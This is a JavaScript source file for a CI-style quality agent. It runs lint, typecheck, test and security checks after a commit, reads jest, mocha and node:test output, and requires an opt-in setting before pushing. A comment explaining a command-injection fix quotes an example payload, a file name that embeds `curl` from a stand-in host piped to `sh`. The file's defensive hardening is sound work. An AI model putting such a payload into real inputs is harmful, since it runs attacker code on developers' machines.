#!/usr/bin/env node
/**
 * Background Quality Agent
 *
 * Runs all quality checks asynchronously after commit.
 * Auto-pushes on success, notifies on failure.
 *
 * Features:
 * - Detects test frameworks automatically
 * - Runs only affected tests when possible (smart test selection)
 * - Uses lockfile to prevent concurrent runs
 * - Self-heals from interrupted runs
 * - Terminal notifications
 * - Tiered execution (Tier 1 blocking, Tier 2 warning)
 * - Pull-rebase-push on remote conflict
 *
 * Dual role: this file is BOTH a script and a library.
 *  - As a script (run directly): a `require.main === module` guard runs main().
 *  - As a library (require'd): it exports the reusable check/push building blocks
 *    (runLint, runTypecheck, runSmartTests, runFullTests, runSecurityScan,
 *    runTieredChecks, pushToRemote, printSummary) with NO auto-run side effect.
 *    Consumed by src/commands/push.js.
 *
 * X4 — READING THE RUNNER. This module's test verdict GATES THE PUSH (src/commands/
 * push.js blocks on `!passed`), so it reads THREE runner vocabularies — node:test
 * (`# pass N` / `ℹ pass N`, TAP and spec reporters, colorized or not), jest
 * (`Tests: N passed`) and mocha (`N passing`) — and it fails CLOSED on an instrument
 * that was PRESENT but ILLEGIBLE, surfacing the existing `undetermined` state rather
 * than a green verdict. It cross-checks the exit code against a readable fail count:
 * a runner that reports failures on stdout and exits 0 anyway is a liar, not a pass.
 * A project with NO counters at all (a plain assertion script whose exit code IS its
 * instrument) still passes — refusing it would be a false red, and a guard that cries
 * wolf gets disabled.
 */

const { execSync, execFileSync } = require('child_process');
const path = require('path');
const safeFs = require('./safe-fs');

const qualityState = require('./quality-state');
const toolDetector = require('./tool-detector');
const { findChangedFiles } = require('./hash-utils');
const { findAffectedTests } = require('./coverage-map');

// The real security fleet — wired into the live quality path (push.js →
// runSecurityScan) so Iron Loop Step 13 SECURE performs a genuine scan instead
// of the six naive inline regexes that used to live here. Each scanner degrades
// LOUDLY: a missing external tool is announced as a skip, never a silent pass,
// and never a crash.
const { SecretsScanner } = require('./secrets-scanner');
const { DependencyAuditor, auditedLanguagesFor } = require('./dependency-auditor');
const { SASTRunner, TOOL_CONFIGS } = require('./sast-runner');
const { SCARunner } = require('./sca-runner');
const { MigrationSafetyChecker } = require('./migration-safety-checker');
const { FrameworkSecurityChecker } = require('./framework-security-checker');

// R3-C: the push ship gate. The quality agent runs UNATTENDED after every commit;
// it may check, it may report, it may NOT ship. `isAutoPushEnabled` is the only
// authority for a machine push and is false unless the human opted in.
const { isAutoPushEnabled } = require('./settings');

/**
 * Parse CLI arguments.
 *
 * SHIP GATE (R3-C): `onSuccess` now defaults to 'none', never 'push'. A machine
 * that pushes because nobody passed a flag is a machine crossing a human ship gate
 * by default. Even an explicit `--on-success=push` is not sufficient — the argv
 * only expresses INTENT; `maybePushOnSuccess` consults the canonical setting
 * (`git.autoPushEnabled`) for AUTHORITY.
 *
 * @param {string[]} [argv=process.argv.slice(2)] - argument vector (injectable for tests)
 * @returns {{triggeredBy: string, onSuccess: string, verbose: boolean}}
 */
function parseArgs(argv = process.argv.slice(2)) {
  const args = {
    triggeredBy: 'manual',
    onSuccess: 'none',
    verbose: false
  };

  for (const arg of argv) {
    if (arg.startsWith('--triggered-by=')) {
      args.triggeredBy = arg.split('=')[1];
    } else if (arg.startsWith('--on-success=')) {
      args.onSuccess = arg.split('=')[1];
    } else if (arg === '--verbose' || arg === '-v') {
      args.verbose = true;
    }
  }

  return args;
}

/**
 * Run a shell command and capture output
 */
function runCommand(cmd, options = {}) {
  // A quality check must never hang the gate forever. Every subprocess is bounded;
  // 300000ms (5 min) matches the SAST default. A command that a caller expects to
  // watch/tail/wait-on-stdin would otherwise pin the gate indefinitely.
  const { silent = false, allowFail = false, timeout = 300000 } = options;

  try {
    const output = execSync(cmd, {
      encoding: 'utf8',
      stdio: silent ? 'pipe' : 'inherit',
      maxBuffer: 10 * 1024 * 1024, // 10MB
      timeout
    });
    return { success: true, output: output?.trim() || '' };
  } catch (err) {
    // A timeout (execSync sets err.killed / err.signal='SIGTERM', or code ETIMEDOUT)
    // is a LOUD failure, never a swallow.
    const timedOut = Boolean(err.killed) || err.signal === 'SIGTERM' || err.code === 'ETIMEDOUT';
    if (allowFail) {
      const result = { success: false, output: err.stdout || '', error: err.message };
      if (timedOut) result.timedOut = true;
      return result;
    }
    // Non-allowFail callers (e.g. pushToRemote's `git push`) rely on throw-to-fail;
    // returning here would let them mistake a timeout for success. Re-throw loudly.
    throw err;
  }
}

/**
 * Run a command via an ARGV VECTOR (no shell) and capture output.
 *
 * The injection-safe sibling of {@link runCommand}: the binary and each argument are
 * passed as SEPARATE elements to execFileSync with `shell:false`, so NO shell (/bin/sh
 * -c) ever interprets an operand. This is the ONLY path used for runSpecificTests'
 * per-framework invocations, whose test-file/package operands originate from
 * `.ctoc/state/coverage-map.json` (arbitrary, unsanitized strings) or a filename
 * heuristic. On the old `execSync(\`npx jest ${files.join(' ')}\`)` string path a
 * path like `a$(curl -s evil|sh).test.js` was a shell command substitution and ran
 * arbitrary code on every `/ctoc:push`; here it is one literal argv element, inert.
 *
 * Contract mirrors runCommand EXACTLY — same {silent, allowFail, timeout} options and
 * the same {success, output, error?, timedOut?} return shape — so the allowFail
 * capture (read err.stdout/err.status without throwing), the silent flag, and the
 * pass-count parsing all behave identically to the shell path.
 *
 * @param {string} bin - the executable (an argv[0], never a shell string)
 * @param {string[]} args - argument vector; each element is passed literally
 * @param {{silent?: boolean, allowFail?: boolean, timeout?: number}} [options]
 * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean}}
 */
function runCommandArgv(bin, args, options = {}) {
  const { silent = false, allowFail = false, timeout = 300000 } = options;

  try {
    const output = execFileSync(bin, args, {
      encoding: 'utf8',
      stdio: silent ? 'pipe' : 'inherit',
      shell: false, // the whole point: no shell parses the operands
      maxBuffer: 10 * 1024 * 1024, // 10MB
      timeout
    });
    return { success: true, output: output?.trim() || '' };
  } catch (err) {
    // A test framework exits non-zero on failing tests but still prints its report to
    // stdout (carried on err.stdout) — the allowFail path reads it, exactly like
    // runCommand. A timeout is surfaced LOUDLY, never swallowed.
    const timedOut = Boolean(err.killed) || err.signal === 'SIGTERM' || err.code === 'ETIMEDOUT';
    if (allowFail) {
      const result = { success: false, output: err.stdout || '', error: err.message };
      if (timedOut) result.timedOut = true;
      return result;
    }
    throw err;
  }
}

/**
 * Finding A (SEVERE) — languages whose test command the DETECTOR could not determine
 * (test:null AND testUndetermined:true). tool-detector sets testUndetermined ONLY when it
 * GAVE UP (no scripts.test, no recognized framework); an EXPLICIT user `test:null` override
 * DELETES the flag, so an intentional "no test command" is NOT returned here.
 *
 * A detector-undetermined test command must NEVER be silently treated as "nothing to run =
 * PASS": pre-R10 those repos got `npm test` → exit non-zero → a LOUD block, and the "no
 * silent test failures / the measure is the human" red line requires the same loud outcome
 * now. The R10 detector got honest (null + flag) but no consumer read the flag, so the test
 * loop's `if (!langTools.test) continue` skipped the language and the run passed green while
 * tests NEVER ran — pushing an unverified repo. This restores the loud block.
 *
 * @param {Object<string, {test?: (string|null), testUndetermined?: boolean}>} tools
 * @returns {string[]} language names with an undetermined (detector-gave-up) test command
 */
function undeterminedTestLanguages(tools) {
  return Object.entries(tools || {})
    .filter(([, t]) => t && t.testUndetermined && !t.test)
    .map(([lang]) => lang);
}

/**
 * The NON-pass result surfaced when a language's test command is undetermined. Shaped like
 * the other test-runner results so consumers (push.js) block on `!passed`; `undetermined`
 * is added so the human sees WHY it is not a pass. Never a silent green.
 * @param {string[]} langs the undetermined languages
 * @returns {{passed:false, undetermined:true, passCount:number, failed:number, skipped:number, flaky:number, output:string}}
 */
function undeterminedTestsResult(langs) {
  const msg = `tests undetermined — NOT verified for: ${langs.join(', ')} `
    + '(no test script and no recognized framework — cannot confirm tests ran). '
    + 'Declare a test command in package.json "scripts.test" or .ctoc/quality-config.yaml.';
  console.log(`   ${msg}`);
  return { passed: false, undetermined: true, passCount: 0, failed: 0, skipped: 0, flaky: 0, output: msg };
}

// ---------------------------------------------------------------------------
// X4 — ANSI. Node COLORIZES its reporter output when FORCE_COLOR is set, EVEN WHEN
// PIPED, so the line these parsers receive is `ESC[32mℹ pass 8ESC[39m`, not `ℹ pass 8`.
//
// Mirrored from src/lib/step-13-verify.js (X3), which mirrored src/scripts/test-gate.js
// (X2) — deliberately NOT imported: neither exports stripAnsi (it has no caller outside
// itself, and the export fence treats an unreachable export as dead surface).
//
// DEBT, RECORDED: this is the THIRD copy. X3 flagged that a shared src/lib/ansi.js is
// the better answer at two copies; at three that argument is stronger still. It is
// nonetheless NOT this plan's call — consolidating would change two landed contracts
// from inside a third plan. Recorded in the plan for the owner to schedule.
//
// No new dependency (`strip-ansi` would do this in one import): the repo rule is stdlib
// and what is already installed. The escape byte is the `\x1b` ESCAPE SEQUENCE, never a
// raw control byte (invisible in review, mangles diffs). LITERAL RegExp, not
// `new RegExp(...)`: src/ enforces `security/detect-non-literal-regexp` at error under
// --max-warnings 0, and warnings are bugs.
// ---------------------------------------------------------------------------
const ANSI_PATTERN =
  /\x1b\[[0-9;:<=>?]*[ -/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\x1b[@-Z\\-_]/g;
//  ^ CSI (SGR colour `ESC[31m`, cursor moves)  ^ OSC (hyperlinks/titles)  ^ 2-char escapes

/**
 * Remove ANSI escape sequences so the line-anchored parsers below see the real first
 * character of each line rather than an escape byte.
 * @param {string} text - Raw captured output.
 * @returns {string} The text with all ANSI escape sequences removed.
 */
function stripAnsi(text) {
  return String(text == null ? '' : text).replace(ANSI_PATTERN, '');
}

/**
 * Return the LAST match of `re` (which MUST carry the `g` flag) in `text`, or null.
 * A runner emits its aggregate summary AFTER all test output, so the last match is the
 * real one — an earlier stray/spoofed counter must never win over it.
 * @param {string} text
 * @param {RegExp} re - a global regex with one capture group.
 * @returns {RegExpExecArray|null}
 */
function lastCap(text, re) {
  let m;
  let last = null;
  while ((m = re.exec(text)) !== null) last = m;
  return last;
}

/**
 * Read the PASSING-test count from a runner's output.
 *
 * THREE vocabularies, in precision order (Decision 2: EXTEND, never replace — this
 * module serves every project CTOC is installed into, not only CTOC's own node:test
 * suite, and deleting the jest/mocha idiom to fix node:test would be a regression):
 *
 *   1. node:test — `# pass 8` (TAP) / `ℹ pass 8` (spec, node's DEFAULT). The idiom is
 *      `pass`, NOT `passed|passing`; the old regex could not read EITHER reporter, in
 *      EITHER colour. CTOC's own suite is node:test, so this module was blind to the
 *      runner CTOC itself uses.
 *   2. jest — the `Tests: 8 passed, 8 total` summary line, anchored to `Tests:`.
 *      MEASURED, not assumed: on REAL jest output the old unanchored regex matched
 *      `Test Suites: 1 passed` FIRST and reported the SUITE count (1) as the test
 *      count (8). It did not read jest correctly either.
 *   3. mocha — `8 passing`, anchored to line start.
 *
 * Every pattern is LINE-ANCHORED and takes the LAST match, so a counter embedded
 * mid-line in a TEST NAME (this module's own fixtures name such strings) cannot hijack
 * the count. The final fallback is the ORIGINAL unanchored `N passed|passing` regex,
 * kept last so any other runner that used to be read still is — never first, because it
 * is the imprecise one.
 *
 * @param {string} out - Captured runner output (colour tolerated).
 * @returns {number|null} The passing count, or null when no counter could be read.
 */
function parsePassCount(out) {
  const text = stripAnsi(out);
  const node = lastCap(text, /^\s*(?:#|ℹ)\s+pass\s+(\d+)/gim);
  if (node) return parseInt(node[1], 10);
  const jest = lastCap(text, /^\s*Tests:\s.*?(\d+)\s+passed/gim);
  if (jest) return parseInt(jest[1], 10);
  const mocha = lastCap(text, /^\s*(\d+)\s+passing\b/gim);
  if (mocha) return parseInt(mocha[1], 10);
  const legacy = text.match(/(\d+)\s*(passed|passing)/i);
  return legacy ? parseInt(legacy[1], 10) : null;
}

/**
 * Read the FAILING-test count from a runner's output.
 *
 * Returns NULL — not 0 — when the counter cannot be read. That distinction is the whole
 * point: a parser whose no-match default is the SUCCESS value is a false-green machine.
 * Copied from `parseFailCount` in src/lib/step-13-verify.js (X3) and `parseFail` in
 * src/scripts/test-gate.js (X2).
 *
 * EVERY pattern is line-anchored, deliberately: an unanchored fail regex would read a
 * failure count out of a TEST NAME and block a legitimate push — a FALSE RED on the one
 * verdict that gates shipping.
 *
 * @param {string} out - Captured runner output (colour tolerated).
 * @returns {number|null} The failing count, or null when unreadable.
 */
function parseFailCount(out) {
  const text = stripAnsi(out);
  const node = lastCap(text, /^\s*(?:#|ℹ)\s+fail\s+(\d+)/gim);
  if (node) return parseInt(node[1], 10);
  const jest = lastCap(text, /^\s*Tests:\s.*?(\d+)\s+failed/gim);
  if (jest) return parseInt(jest[1], 10);
  const mocha = lastCap(text, /^\s*(\d+)\s+failing\b/gim);
  if (mocha) return parseInt(mocha[1], 10);
  return null;
}

/**
 * Read the SKIPPED/TODO test count from a runner's output.
 *
 * Mirrors `parseSkippedCount` in src/lib/step-13-verify.js. This module used to return a
 * HARDCODED `0` for every run — so it did not enforce CLAUDE.md's "0 skipped" contract,
 * it ASSERTED compliance with it, whatever the run actually did.
 *
 * @param {string} out - Captured runner output (colour tolerated).
 * @returns {number} The skipped+todo count (0 when none is reported).
 */
function parseSkippedCount(out) {
  let n = 0;
  const text = stripAnsi(out);
  for (const re of [/(?:#|ℹ)\s*skipped\s+(\d+)/ig, /(?:#|ℹ)\s*todo\s+(\d+)/ig]) {
    let m;
    while ((m = re.exec(text)) !== null) n += parseInt(m[1], 10);
  }
  if (n === 0) {
    const mSkip = text.match(/(\d+)\s+skipped/i);
    if (mSkip) n += parseInt(mSkip[1], 10);
    const mPend = text.match(/(\d+)\s+pending/i);
    if (mPend) n += parseInt(mPend[1], 10);
  }
  return n;
}

/**
 * True when the output carries evidence that a node:test-shaped runner reported a
 * SUMMARY — i.e. the instrument this module claims to read was PRESENT.
 *
 * MIRRORED VERBATIM from `hasTestSummaryEvidence` in src/lib/step-13-verify.js (X3),
 * deliberately unchanged. It is the boundary that keeps the fail-closed rule from
 * becoming a FALSE RED — which would be worse than the false green it replaces, because
 * a guard that cries wolf gets disabled. A project whose runner is not node:test at all
 * (`node test/widget.test.js` printing `ok: ...` and exiting 0 — what
 * tests/greenfield-journey.test.js seeds) has output, no fail line, and ITS EXIT CODE IS
 * ITS INSTRUMENT: it reported success and there is no illegible dial to fail on.
 *
 * The rule is therefore narrower than "output but no fail line": the run must LOOK like
 * the thing we parse. When it does and the fail count still cannot be read, the run is
 * UNCERTIFIED.
 *
 * @param {string} out - Captured runner output (colour tolerated).
 * @returns {boolean} Whether a node:test-shaped fail counter should have been readable.
 */
function hasTestSummaryEvidence(out) {
  const text = stripAnsi(out);
  return (
    // A sibling summary counter from the same block as `fail` (TAP `#` or spec `ℹ`).
    /^\s*(?:#|ℹ)\s+(?:tests|suites|pass|cancelled|skipped|todo|duration_ms)\b/im.test(text)
    // A fail-SHAPED counter line we could not read a number out of — a renamed key
    // (`ℹ failures 2`) or a malformed value. The dial is there; it is illegible.
    || /^\s*(?:#|ℹ)\s+fail\w*\b/im.test(text)
    // Raw TAP failure output with no readable aggregate: failures are evident and
    // unquantified. That is uncertified, never clean.
    || /^\s*not ok\b/im.test(text)
    || /^\s*TAP version\b/im.test(text)
  );
}

/**
 * Read every counter out of ONE runner's exit-0 output in a single pass.
 *
 * `failCount` is null when unreadable; `unreadable` is true ONLY when the instrument was
 * PRESENT but illegible (see hasTestSummaryEvidence) — never merely because no counter
 * exists.
 *
 * @param {string} out - Captured runner output.
 * @returns {{passCount: number, failCount: (number|null), skipped: number, unreadable: boolean}}
 */
function readRunnerCounters(out) {
  const failCount = parseFailCount(out);
  const passCount = parsePassCount(out);
  return {
    passCount: passCount === null ? 0 : passCount,
    failCount,
    skipped: parseSkippedCount(out),
    unreadable: failCount === null && hasTestSummaryEvidence(out)
  };
}

/**
 * The NON-pass result for a run whose instrument was PRESENT but ILLEGIBLE.
 *
 * Decision 4: reuses this module's EXISTING `undetermined` state rather than inventing a
 * fourth one — consumers (push.js) block on `!passed`, so undetermined already blocks,
 * and `undetermined:true` tells the human WHY it is not a pass. "I could not read the
 * fail count" and "there were zero failures" are different facts and must never produce
 * the same verdict.
 *
 * @param {string} lang - The language whose runner went unread.
 * @param {number} passCount - Passing tests counted so far.
 * @param {number} skipped - Skipped tests counted so far.
 * @returns {{passed:false, undetermined:true, passCount:number, failed:number, skipped:number, flaky:number, output:string}}
 */
function unreadableTestsResult(lang, passCount, skipped) {
  const msg = `tests undetermined — NOT verified for ${lang}: the runner reported a test `
    + 'summary but its fail counter could not be read. An unreadable instrument is not a '
    + 'clean run — this run is UNCERTIFIED, not green.';
  console.log(`   ${msg}`);
  return { passed: false, undetermined: true, passCount, failed: 0, skipped, flaky: 0, output: msg };
}

/**
 * Run lint check
 */
async function runLint(tools) {
  console.log('\n  Running lint...');

  for (const [_lang, langTools] of Object.entries(tools)) {
    if (!langTools.lint) continue;

    const result = runCommand(langTools.lint, { allowFail: true, silent: true });
    if (!result.success) {
      return {
        passed: false,
        errors: 1,
        warnings: 0,
        output: result.output || result.error
      };
    }
  }

  console.log('   Lint passed');
  return { passed: true, errors: 0, warnings: 0 };
}

/**
 * Run type check
 */
async function runTypecheck(tools) {
  console.log('\n  Running type check...');

  for (const [_lang, langTools] of Object.entries(tools)) {
    if (!langTools.typecheck) continue;

    const result = runCommand(langTools.typecheck, { allowFail: true, silent: true });
    if (!result.success) {
      return {
        passed: false,
        errors: 1,
        output: result.output || result.error
      };
    }
  }

  console.log('   Type check passed');
  return { passed: true, errors: 0 };
}

/**
 * Run specific test files using the appropriate framework command
 * @param {Object} tools - Detected tools per language
 * @param {string[]} testFiles - Specific test file paths
 * @returns {Object} Test result
 */
function runSpecificTests(tools, testFiles) {
  // Finding A: a detector-undetermined test command is NOT a silent pass.
  const undetermined = undeterminedTestLanguages(tools);
  if (undetermined.length) return undeterminedTestsResult(undetermined);

  let totalPassed = 0;
  let totalFailed = 0;
  let totalSkipped = 0;

  for (const [lang, langTools] of Object.entries(tools)) {
    if (!langTools.test) continue;

    // COMMAND-INJECTION FIX: testFiles come from .ctoc/state/coverage-map.json
    // (entry.tests — arbitrary, unsanitized strings) or a filename heuristic. They
    // MUST NEVER be interpolated into a shell command string. Every per-framework
    // invocation runs on the argv-safe path (runCommandArgv → execFileSync,
    // shell:false), so a path like `a$(...).test.js` is one literal argv element, not
    // a shell substitution. This mirrors the established pattern in sca-runner.js /
    // sast-runner.js / secrets-scanner.js. On Windows the npx launcher is a `.cmd`
    // shim, mirroring sca-runner's `npm.cmd` handling.
    const npx = process.platform === 'win32' ? 'npx.cmd' : 'npx';

    let result;
    if (langTools.testFramework === 'jest') {
      result = runCommandArgv(npx, ['jest', ...testFiles], { allowFail: true, silent: true });
    } else if (langTools.testFramework === 'vitest') {
      result = runCommandArgv(npx, ['vitest', 'run', ...testFiles], { allowFail: true, silent: true });
    } else if (langTools.testFramework === 'pytest') {
      result = runCommandArgv('pytest', [...testFiles], { allowFail: true, silent: true });
    } else if (langTools.testFramework === 'go') {
      // For Go, convert file paths to package paths. Go import paths are ALWAYS
      // forward-slashed, so normalize both separators to '/' FIRST (a Windows
      // coverage map yields backslash paths) and take the directory with posix
      // semantics — deterministic and identical on every platform. Using the
      // platform path.dirname here would emit `./pkg\sub/...` on Windows.
      const packages = [...new Set(testFiles.map(f => {
        const unix = f.split(/[\\/]+/).join('/');
        return './' + path.posix.dirname(unix) + '/...';
      }))];
      result = runCommandArgv('go', ['test', ...packages], { allowFail: true, silent: true });
    } else {
      // Fallback: run the full suite. langTools.test is a CONFIGURED command string
      // from the detector (e.g. `npm test`) with NO file-derived interpolation, so it
      // legitimately stays on the shell path — a user's `npm test && ...` still works.
      result = runCommand(langTools.test, { allowFail: true, silent: true });
    }

    if (!result.success) {
      return {
        passed: false,
        passCount: totalPassed,
        failed: totalFailed + 1,
        skipped: totalSkipped + parseSkippedCount(result.output),
        flaky: 0,
        output: result.output || result.error
      };
    }

    // X4 — the runner exited 0. That is its CLAIM, not a verdict: read the instrument
    // and cross-check it. Same contract as runFullTests below.
    const counters = readRunnerCounters(result.output);

    if (counters.unreadable) {
      return unreadableTestsResult(lang, totalPassed, totalSkipped);
    }

    if (counters.failCount !== null && counters.failCount > 0) {
      return {
        passed: false,
        passCount: totalPassed + counters.passCount,
        failed: totalFailed + counters.failCount,
        skipped: totalSkipped + counters.skipped,
        flaky: 0,
        output: result.output
      };
    }

    totalPassed += counters.passCount;
    totalSkipped += counters.skipped;
  }

  return {
    passed: true,
    passCount: totalPassed,
    failed: 0,
    skipped: totalSkipped,
    flaky: 0
  };
}

/**
 * Run all tests (full suite fallback)
 */
async function runFullTests(tools) {
  // Finding A: a detector-undetermined test command is NOT a silent pass.
  const undetermined = undeterminedTestLanguages(tools);
  if (undetermined.length) return undeterminedTestsResult(undetermined);

  let totalPassed = 0;
  let totalFailed = 0;
  let totalSkipped = 0;

  for (const [lang, langTools] of Object.entries(tools)) {
    if (!langTools.test) continue;

    console.log(`   Running full ${lang} test suite...`);
    const result = runCommand(langTools.test, { allowFail: true, silent: true });

    if (!result.success) {
      const output = result.output || result.error || '';

      // Check for flaky indicators
      if (output.includes('flaky') || output.includes('retry')) {
        console.log('   Flaky tests detected - 0 tolerance policy');
        return {
          passed: false,
          passCount: totalPassed,
          failed: totalFailed + 1,
          skipped: totalSkipped,
          flaky: 1,
          output
        };
      }

      return {
        passed: false,
        passCount: totalPassed,
        failed: totalFailed + 1,
        skipped: totalSkipped + parseSkippedCount(output),
        flaky: 0,
        output
      };
    }

    // X4 — the runner exited 0. Do NOT take that as the verdict on its own: a runner can
    // report FAILURES on stdout yet exit 0 (a wrapping `|| true`, `set +e`, jest
    // --passWithNoTests, or a reporter that swallows the child's exit code). This module's
    // verdict gates the push, so read the instrument and cross-check the claim.
    const counters = readRunnerCounters(result.output);

    if (counters.unreadable) {
      // The instrument was THERE and we could not read it → UNCERTIFIED, never clean.
      // Only fires when a summary was actually reported: a plain assertion script that
      // printed a line and exited 0 has no illegible dial and stays green (Decision 1).
      return unreadableTestsResult(lang, totalPassed, totalSkipped);
    }

    if (counters.failCount !== null && counters.failCount > 0) {
      console.log(`   ${counters.failCount} failing test(s) reported despite exit 0 — NOT a pass`);
      return {
        passed: false,
        passCount: totalPassed + counters.passCount,
        failed: totalFailed + counters.failCount,
        skipped: totalSkipped + counters.skipped,
        flaky: 0,
        output: result.output
      };
    }

    totalPassed += counters.passCount;
    totalSkipped += counters.skipped;
  }

  console.log(`   Tests passed (${totalPassed} total)`);
  return {
    passed: true,
    passCount: totalPassed,
    failed: 0,
    // X4: the REAL count, read from the output — never a hardcoded 0. Reporting is this
    // module's job; the "0 skipped" contract is enforced at Step 14 VERIFY, whose
    // threshold this plan deliberately does not touch.
    skipped: totalSkipped,
    flaky: 0
  };
}

/**
 * Run smart tests - only tests affected by changed files
 * Uses hash-based change detection and coverage map for test selection.
 */
async function runSmartTests(tools) {
  console.log('\n  Running tests...');

  // Finding A (SEVERE): a detector-undetermined test command is NOT a silent pass. This
  // MUST run before the changed-files short-circuit below — otherwise a repo with no git
  // delta would return passed:true and the unverified state would never surface.
  const undetermined = undeterminedTestLanguages(tools);
  if (undetermined.length) return undeterminedTestsResult(undetermined);

  // 1. Get changed files from git
  const changedResult = runCommand('git diff HEAD~1 --name-only', { silent: true, allowFail: true });
  const gitChangedFiles = (changedResult.output || '').split('\n').filter(f => f.trim());

  if (gitChangedFiles.length === 0) {
    console.log('   No changed files detected.');
    return { passed: true, passCount: 0, failed: 0, skipped: 0, flaky: 0, cached: true };
  }

  // 2. Compare hashes to find actually-changed files
  const cachedHashes = qualityState.getFileHashes();
  const hashResult = findChangedFiles(
    gitChangedFiles.map(f => path.resolve(f)),
    cachedHashes
  );

  if (hashResult.changed.length === 0) {
    console.log('   No file content changes detected. Cache valid.');
    return { passed: true, passCount: 0, failed: 0, skipped: 0, flaky: 0, cached: true };
  }

  console.log(`   ${hashResult.changed.length} file(s) changed`);

  // 3. Find affected tests via coverage map
  const affected = findAffectedTests(hashResult.changed, cachedHashes);

  if (affected.requiresFullSuite) {
    console.log(`   Full suite required: ${affected.reason}`);
    const result = await runFullTests(tools);

    // Update hash cache on success
    if (result.passed) {
      qualityState.updateFileHashes(hashResult.currentHashes);
    }

    return result;
  }

  if (affected.tests.length === 0) {
    console.log('   No tests affected by changes.');

    // Update hash cache
    qualityState.updateFileHashes(hashResult.currentHashes);

    return { passed: true, passCount: 0, failed: 0, skipped: 0, flaky: 0 };
  }

  // 4. Run only affected tests
  console.log(`   Running ${affected.tests.length} affected test(s)...`);
  const result = runSpecificTests(tools, affected.tests);

  // 5. Update hash cache on success
  if (result.passed) {
    qualityState.updateFileHashes(hashResult.currentHashes);
  }

  return result;
}

/**
 * List the files THIS PUSH introduces, relative to the project root — the real
 * push delta, scoped to what has NOT yet reached the upstream branch.
 *
 * R4-A finding: the old scope was `git diff HEAD~1` — the LAST COMMIT only. A
 * secret committed two commits back and not yet pushed was NEVER scanned, and the
 * gate was effectively blind to everything but the tip commit. The correct delta
 * is `@{upstream}..HEAD` (every commit on HEAD the remote does not yet have). When
 * there is no upstream (a brand-new branch with nothing to diff against), the
 * whole push is new, so ALL tracked files are the delta. Returns null only when
 * git itself is unavailable, so the caller falls back to a whole-project scan.
 *
 * @param {string} projectRoot
 * @returns {string[]|null}
 */
function getPushChangedFiles(projectRoot) {
  const gitOut = (args) => execSync(args, { cwd: projectRoot, encoding: 'utf8', stdio: 'pipe' });
  try {
    // An upstream must exist for @{upstream} to resolve; probe it explicitly so
    // "no upstream" is handled deterministically rather than via a diff error.
    let hasUpstream = false;
    try {
      gitOut('git rev-parse --abbrev-ref --symbolic-full-name @{upstream}');
      hasUpstream = true;
    } catch {
      hasUpstream = false;
    }

    if (hasUpstream) {
      const out = gitOut('git diff @{upstream}..HEAD --name-only');
      return out.split('\n').map(f => f.trim()).filter(Boolean);
    }

    // No upstream → the entire branch is unpushed; every tracked file is new to
    // the remote. Scan them all rather than diffing against a nonexistent base.
    const tracked = gitOut('git ls-files');
    return tracked.split('\n').map(f => f.trim()).filter(Boolean);
  } catch {
    return null; // no git at all → caller scans the whole project directory
  }
}

/**
 * Classify a scanner-reported severity into the gate bucket that decides blocking:
 * CRITICAL and HIGH block the push; MEDIUM (and below) are surfaced but non-blocking.
 *
 * F-3 (fail-secure): the match is normalized (`String(...).toUpperCase().trim()`) so a
 * non-canonical label a scanner might emit ('Critical', 'high') is still classified
 * correctly, and — crucially — an UNRECOGNIZED or MISSING severity is treated as a
 * blocking HIGH, never a silent non-blocking medium. The previous exact-case `else →
 * medium` failed OPEN: any label that was not the literal 'CRITICAL'/'HIGH' (including
 * undefined) counted as a non-blocking medium and shipped green. All six current
 * scanners emit canonical uppercase, so this is defense-in-depth, not a live exploit —
 * but a mislabeled finding must fail the gate, not slip through it.
 *
 * @param {*} sev - a scanner-reported severity (string, or missing)
 * @returns {'CRITICAL'|'HIGH'|'MEDIUM'} the gate bucket
 */
function classifySeverity(sev) {
  const s = String(sev == null ? '' : sev).toUpperCase().trim();
  if (s === 'CRITICAL') return 'CRITICAL';
  if (s === 'HIGH') return 'HIGH';
  // Recognized non-blocking severities any current scanner may emit.
  if (s === 'MEDIUM' || s === 'MODERATE' || s === 'LOW' || s === 'INFO' || s === 'INFORMATIONAL') {
    return 'MEDIUM';
  }
  // F-3 fail-secure: an unrecognized or missing severity blocks (HIGH), never a silent medium.
  return 'HIGH';
}

/**
 * Run the real security scan (Iron Loop Step 13 SECURE).
 *
 * Aggregates four genuine scanners, each degrading LOUDLY:
 *   1. Secrets  — pure-JS SecretsScanner (no external tool). Always runs.
 *                 Scoped to the push delta by default; whole project when
 *                 `opts.allFiles` is set or git history is unavailable.
 *   2. Deps     — DependencyAuditor (npm/pip/go/cargo/... audit). Runs when a
 *                 package manager + its audit tool is present; otherwise the
 *                 absence is reported as an explicit skip.
 *   3. SAST     — SASTRunner (semgrep/bandit/gosec/eslint-security). Runs when a
 *                 scanner is available for a detected language; otherwise the
 *                 absence is reported as an explicit skip.
 *   4. SCA      — SCARunner (registry-driven dependency-CVE audit). npm audit /
 *                 pip-audit / cargo audit are parsed natively; every other
 *                 ecosystem routes to the osv-scanner universal pass. Runs when a
 *                 parseable scanner is available; otherwise a per-language skip.
 *
 * A finding at CRITICAL or HIGH severity from ANY scanner fails the gate. A
 * missing tool or a scanner that throws becomes a loud skip — it NEVER silently
 * passes and NEVER crashes the push.
 *
 * @param {Object} [_tools] detected tools (unused; scanners self-detect). Present
 *   for signature-compatibility with the other tiered runners.
 * @param {Object} [opts]
 * @param {string} [opts.projectRoot=process.cwd()]
 * @param {boolean} [opts.allFiles=false] scan the whole tree, not just the delta
 * @returns {Promise<{passed:boolean, critical:number, high:number, medium:number,
 *   details:string, skipped:string[]}>}
 */
async function runSecurityScan(_tools, opts = {}) {
  console.log('\n  Running security scan...');

  const projectRoot = opts.projectRoot || process.cwd();
  const skipped = [];
  const detail = [];
  let critical = 0;
  let high = 0;
  let medium = 0;

  const bump = (sev) => {
    const bucket = classifySeverity(sev);
    if (bucket === 'CRITICAL') critical++;
    else if (bucket === 'HIGH') high++;
    else medium++; // MEDIUM/MODERATE/LOW/INFO surfaced but non-blocking
  };

  // 1. SECRETS — always runs (pure JS, no external dependency).
  try {
    const scanner = new SecretsScanner(projectRoot);
    const changed = opts.allFiles ? null : getPushChangedFiles(projectRoot);

    if (changed === null) {
      await scanner.run(); // whole project → populates scanner.findings
    } else {
      for (const rel of changed) {
        const abs = path.resolve(projectRoot, rel);
        if (!safeFs.existsSync(abs)) continue; // deleted/renamed in the delta
        if (!scanner.shouldScan(abs)) continue;
        // F-4: scan each delta file in ITS OWN try/catch. A single unreadable/renamed
        // file that throws must be recorded as a per-file skip and the rest of the delta
        // must still be scanned — the old step-wide try/catch abandoned EVERY remaining
